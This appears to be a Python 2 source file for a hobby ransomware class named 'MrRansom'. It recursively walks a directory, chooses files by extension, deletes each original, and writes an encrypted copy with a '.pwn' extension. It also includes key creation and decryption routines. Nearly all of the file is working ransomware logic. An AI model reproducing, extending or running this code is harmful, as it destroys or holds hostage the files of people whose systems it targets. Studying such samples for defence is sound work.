import json
import os
import sys

import locksmith
from aldersonalgorithm import AldersonAlgorithm
from file_util import get_file, put_file, get_file_bytes_e64, put_file_d64

ENCRYPT = 'encrypt'

DECRYPT = 'decrypt'

FILE_TYPES_JSON = os.path.join(os.path.dirname(os.path.realpath(__file__)), "file_types.json")

ENCRYPTED_EXTENSION = ".pwn"


def get_target_files(files, mode):
    files_to_process = []
    for file_path in files:
        if should_process(file_path, mode):
            files_to_process.append(file_path)

    return files_to_process


def should_process(file_path, mode):
    return mode == ENCRYPT and can_encrypt_file(file_path) \
           or mode == DECRYPT and can_decrypt_file(file_path)


def can_encrypt_file(file_path):
    for file_type in encryptable_file_types():
        if file_path.endswith(file_type) and not os.path.basename(file_path).startswith("."):
            return True


def can_decrypt_file(file_name):
    if file_name.endswith(ENCRYPTED_EXTENSION):
        return True


def encryptable_file_types():
    types_json = json.loads(get_file(FILE_TYPES_JSON))

    return [file_type for file_type in types_json["fileTypes"]]


class MrRansom:

    def __init__(self, root_dir):
        self.root_dir = root_dir
        self.all_files = [os.path.join(root, file_name) for root, directories, file_names in
                          os.walk(root_dir) for file_name in file_names]

    def encrypt(self):
        key = self.make_key()

        for file_path in get_target_files(self.all_files, ENCRYPT):
            content = get_file_bytes_e64(file_path)
            os.remove(file_path)

            encrypted = AldersonAlgorithm(key).encrypt(content)

            put_file(file_path + ENCRYPTED_EXTENSION, encrypted)

    def decrypt(self):
        key = self.get_key()

        for file_path in get_target_files(self.all_files, DECRYPT):
            content = get_file(file_path)
            os.remove(file_path)

            decrypted = AldersonAlgorithm(key).decrypt(content)

            put_file_d64(file_path[:len(file_path) - len(ENCRYPTED_EXTENSION)], decrypted)

    def make_key(self):
        key = locksmith.create_key()
        try:
            locksmith.export_key_file(self.root_dir, key)
        except Exception as e:
            print >> sys.stderr, e.message
            exit(-1)
        return key

    def get_key(self):
        key = None
        try:
            key = locksmith.get_key_file(self.root_dir)
        except Exception as e:
            print >> sys.stderr, e.message
            exit(-1)
        return key
